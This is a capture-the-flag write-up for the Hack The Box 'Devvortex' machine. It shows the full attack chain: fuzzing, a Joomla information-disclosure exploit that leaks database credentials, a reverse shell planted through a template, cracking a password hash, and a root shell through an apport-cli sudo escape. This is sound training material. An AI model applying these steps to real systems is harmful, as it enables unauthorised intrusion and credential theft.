![Devvortex](https://github.com/amalcew/htb-writeups/assets/73908014/0ca22029-db77-4898-9c70-8bc9900433ff)

## Reconnaissance & port scanning

Initial engagement with the machine was done by port scanning and web enumeration using provided IP address.

```bash
# Nmap 7.94SVN scan initiated Wed Feb 21 20:08:21 2024 as: nmap -sV --open -vvv -oA logs/initial_recon/initial 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up, received conn-refused (0.063s latency).
Scanned at 2024-02-21 20:08:21 CET for 9s
Not shown: 978 closed tcp ports (conn-refused), 20 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 21 20:08:30 2024 -- 1 IP address (1 host up) scanned in 9.56 seconds

```

First findings are ssh and http services running, machine's ip address redirects us to devvortex.htb. IP address was added to `/etc/hosts` for stability:

```bash
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

Machine hosts a web page:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/7fb69279-fd94-40dd-99a9-3ebe7a737997)

Manual exploration of the page didn't give any results. Next step is web fuzzing:

```bash
> ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' | grep -i -v 'Size: 154'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 110ms]
:: Progress: [4989/4989] :: Job [1/1] :: 806 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Enumeration returned a hidden subdomain `dev.devvortex.htb` - let's append this v_host to `/etc/hosts` and check the page.

```bash
echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

![image](https://github.com/amalcew/htb-writeups/assets/73908014/77e4d4c9-b64a-4d93-864d-4f84e2b662db)

Like on previous page, manual exploration didn't return significant results, but repeating fuzzing gave some interesting results:

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://dev.devvortex.htb/FUZZ -t 1000


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1000
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 65ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 65ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 539ms]
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 536ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 72ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 58ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 2094ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 45ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 67ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 68ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 88ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 81ms]
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 113ms]
cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 125ms]
:: Progress: [87664/87664] :: Job [1/1] :: 2858 req/sec :: Duration: [0:00:42] :: Errors: 7 ::
```

There are many promising directories, but `administrator` looks like a sweet spot.

![image](https://github.com/amalcew/htb-writeups/assets/73908014/ea8ffce7-de3b-40bc-a8ef-b950eb51b8b6)

Bingo! The webpage is hosted on Joomla CMS. It is a good practice to check the login prompt for misconfiguration and type default credentials, but this time the prompt looks like well hardened. Quick search for additional tool to scan joomla returns tool named `joomscan`.

```bash
> joomscan --url dev.devvortex.htb  

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found
                                                                                                                     
[+] Checking sensitive config.php.x file                                                                             
[++] Readable config files are not found
```

`joomscan` revealed used Joomla version `4.2.6`. Searching for potential exploits returns solid candidate: [CVE-2023-23752](https://www.exploit-db.com/exploits/51334)

## Initial foothold

In theory, found vulnerability allows threat actor to steal data from the Joomla database, compromising the system. The exploit is worth trying, let's copy the exploit to the working directory using searchsploit:

```bash
> searchsploit --cve 2023-23752
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Joomla! v4.2.8 - Unauthenticated information disclosure                            | php/webapps/51334.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
a
> mkdir -p exploits && cp /usr/share/exploitdb/exploits/php/webapps/51334.py exploits
> cd exploits && mv 51334.py cve-2023-23752.rb
```

Exploit also needed extension changed to `.rb` as it is ruby script, after minor tweaks the exploit is ready to be deployed.

```bash
> ruby cve-2023-23752.rb http://dev.devvortex.htb
ruby: warning: shebang line ending with \r may cause problems
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4nt************0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

Exploit returned a set of credentials for superuser named `lewis`. Attempt to sign into the system with those credentials results in successful login:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/98a5628f-e26d-4e47-8040-5a8db18274ac)

This is a major step in this test. Next, we need to find a way to acquire reverse shell to gain access to the server laying under the CMS. Page exploration reveals template named `Cassiopeia Detail and Files` under **System→Templates→Site Templates**. 

![image](https://github.com/amalcew/htb-writeups/assets/73908014/ff0f7c59-1225-41b0-a003-3ae77608ed1a)

This template allows Joomla administrator to edit or upload additional pages - we will use this mechanism to spawn reverse shell connecting with our machine.

![image](https://github.com/amalcew/htb-writeups/assets/73908014/624af699-eb7d-406b-beb7-2ff24b7bdd0a)

```bash
> nc -lnvp 1234
listening on [any] 1234 ...

```

Using `wget` on malicious file creates a reverse shell connection:

```bash
> wget http://dev.devvortex.htb/templates/cassiopeia/shell.php
--2024-02-21 23:46:23--  http://dev.devvortex.htb/templates/cassiopeia/shell.php
Resolving dev.devvortex.htb (dev.devvortex.htb)... 10.10.11.242
Connecting to dev.devvortex.htb (dev.devvortex.htb)|10.10.11.242|:80... connected.
HTTP request sent, awaiting response... 
```

```bash
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.242] 49890
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## Escalating privileges and obtaining user flag

Let's perform some recon on new grouds:

```bash
$ pwd
/var/www/dev.devvortex.htb/templates/cassiopeia
$ ls /home
logan
$ ls /home/logan
user.txt
$ cat /home/logan/user.txt
cat: /home/logan/user.txt: Permission denied
$
```

Credentials retrieved with usage of CVE-2023-23752 are mainly used to login into MySQL database. Our next goal is to try retrieve `logan` credentials to gain access to **user flag**. Before we connect to the database, let's stabilize the reverse shell.

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
```

Now we can try to retrieve data from database:

```bash
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ mysql -u lewis -p
<vvortex.htb/templates/cassiopeia$ mysql -u lewis -p         
Enter password: P4nt************0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 574
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |

          ... SNIP ...

| sd4fg_users                   |

          ... SNIP ...
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> show columns from sd4fg_users;
show columns from sd4fg_users;
+---------------+---------------+------+-----+---------+----------------+
| Field         | Type          | Null | Key | Default | Extra          |
+---------------+---------------+------+-----+---------+----------------+
| id            | int           | NO   | PRI | NULL    | auto_increment |
| name          | varchar(400)  | NO   | MUL |         |                |
| username      | varchar(150)  | NO   | UNI |         |                |
| email         | varchar(100)  | NO   | MUL |         |                |
| password      | varchar(100)  | NO   |     |         |                |
| block         | tinyint       | NO   | MUL | 0       |                |
| sendEmail     | tinyint       | YES  |     | 0       |                |
| registerDate  | datetime      | NO   |     | NULL    |                |
| lastvisitDate | datetime      | YES  |     | NULL    |                |
| activation    | varchar(100)  | NO   |     |         |                |
| params        | text          | NO   |     | NULL    |                |
| lastResetTime | datetime      | YES  |     | NULL    |                |
| resetCount    | int           | NO   |     | 0       |                |
| otpKey        | varchar(1000) | NO   |     |         |                |
| otep          | varchar(1000) | NO   |     |         |                |
| requireReset  | tinyint       | NO   |     | 0       |                |
| authProvider  | varchar(100)  | NO   |     |         |                |
+---------------+---------------+------+-----+---------+----------------+
17 rows in set (0.00 sec)

mysql> select username, password from sd4fg_users;
select username, password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$****************************************************zm1u |
| logan    | $2y$****************************************************Ij12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

Retrieved passwords are stored in hashes. In general, it is always recommended to try cracking the hash with reliable password dictionary. We will use `rockyou.txt` wordlist to try crack the hash:

```bash
> mkdir -p tools/john && cd tools/john
> echo '$2y$****************************************************Ij12' > hash
> john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
te*********ho    (?)     
1g 0:00:00:25 DONE (2024-02-21 23:15) 0.03966g/s 55.69p/s 55.69c/s 55.69C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Jackpot. Now we can use this password to connect with the machine using `ssh` and retrieve the first flag.

```bash
> ssh logan@10.10.11.242
logan@10.10.11.242's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 21 Feb 2024 11:18:24 PM UTC

  System load:  2.0               Processes:             187
  Usage of /:   62.1% of 4.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from xx.xx.xx.xx
logan@devvortex:~$ cat user.txt 
2e****************************e6
```

## Root privileges escalation and final flag

After gaining standard user access we always want to check for potential vulnerabilities in local escalation using automated tools, but in case of this machine usage of such tools was not neccessary. Using `sudo -l` we acquire knowledge of potentially compromised command 

```bash
logan@devvortex:~$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

logan@devvortex:~$ apport-cli --version
2.20.11
```

`apport-cli` is internal Ubuntu tool used to report crash directly to the developers. This specific version is vulnerable to [CVE-2023-1326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1326), which allows to gain root access through vi-like viewer's command.

```bash
logan@devvortex:~$ sudo apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 3

*** 

Please reproduce the crash and collect a backtrace.  See https://wiki.ubuntu.com/X/Backtracing for directions.

Press any key to continue...  
..dpkg-query: no packages found matching xorg
............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
```
After shell is spawned, we can read the final root flag
```bash
root@devvortex:/home/logan# cat /root/root.txt
db****************************f8
```
